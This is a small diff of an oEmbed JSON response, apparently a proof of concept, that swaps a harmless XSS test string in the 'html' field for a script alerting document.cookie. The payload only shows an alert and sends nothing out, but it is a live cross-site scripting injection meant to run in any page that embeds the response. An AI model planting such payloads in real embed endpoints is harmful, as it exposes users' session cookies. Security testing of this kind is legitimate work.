@@ -7,5 +7,5 @@
   "thumbnail_url": "https://josangeorge.github.io/massah/thumb.png",
   "thumbnail_width": 480,
   "thumbnail_height": 360,
-  "html": "<script>alert('oEmbed XSS');</script>"
+  "html": "<script>alert(document.cookie);</script>"
 }
